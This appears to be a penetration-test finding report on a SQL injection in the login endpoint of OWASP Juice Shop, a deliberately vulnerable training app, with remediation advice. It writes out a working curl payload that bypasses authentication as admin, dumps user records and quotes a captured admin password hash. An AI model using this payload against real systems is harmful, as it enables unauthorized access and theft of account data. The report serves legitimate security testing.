# c03 — SQL Injection in Login Endpoint → Admin Authentication

**Target:** http://host.docker.internal:3000 (OWASP Juice Shop)
**Endpoint:** `POST /rest/user/login`
**Severity:** Critical
**Status:** CONFIRMED (exploited, token saved)

## Vulnerability

The `email` field of `POST /rest/user/login` is concatenated into a SQL query
without parameterization:

```sql
SELECT * FROM Users WHERE email = '<email>' AND password = '<md5(password)>'
```

Injecting `' OR 1=1--` makes the predicate always true and comments out the
password check. Because the query returns rows in id order, the first row
returned is `id=1` — the site administrator (`admin@juice-sh.op`). The server
issues a validly signed admin JWT regardless of the supplied password.

## Exploit

```bash
curl -s -X POST http://host.docker.internal:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}'
```

```json
{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...","umail":"admin@juice-sh.op"}}
```

Reproducible script: `/workspace/pocs/c03_sqli_admin_login.py` (exit 0).

## Impact

- Full authentication bypass: no password required.
- Admin-token theft → access to `/api/Users` (23 accounts, incl. password
  hashes and reset questions), plus all other admin-only Juice Shop endpoints.
- Any account achievable by varying the injection (e.g. filter by email) or by
  enumerating rows.

## Evidence

| File | Content |
|---|---|
| `/workspace/evidence/c3_admin_token.txt` | admin JWT (718 bytes, begins `eyJ`) |
| `/workspace/evidence/c3_users_dump.json` | 23 users dumped via `GET /api/Users` with the token |
| `/workspace/pocs/c03_sqli_admin_login.py` | PoC: baseline 401 → inject → verify admin → save |

JWT claims for the captured token: `id=1`, `email=admin@juice-sh.op`, `role=admin`.

## Verification steps performed

1. Baseline `nobody@example.com` / `wrong` → HTTP 401 (login gate works).
2. Injection payload → HTTP 200 with signed JWT, claims show `role=admin`.
3. `GET /api/Users` with the token → HTTP 200, 23 records (admin-only).
4. Token persisted to `/workspace/evidence/c3_admin_token.txt`.

## Remediation

Use parameterized queries / an ORM for all authentication lookups; never
concatenate user input into SQL. Additionally, do not return the password hash
or other sensitive fields in the login response/JWT payload, and enforce
request body schema validation on the login endpoint.

## Additional finding (observed during re-verification)

The login response nests the *entire* user row inside the JWT payload, including
the MD5 password hash. Captured admin hash: `0192023a7bbd73250516f069df18b500`
(weak, MD5 of a common password) — offline-crackable, giving a second, non-SQLi
path to the same account. This is a separate information-disclosure issue.

Re-verification artifacts:
- `evidence/c3_admin_token.txt` — 718-byte RS256 admin JWT (id=1, role=admin)
- `evidence/c3_verification.log` — baseline 401 vs. injected 200
- `GET /api/Users` with token → HTTP 200, 23 user records (admin-only endpoint)
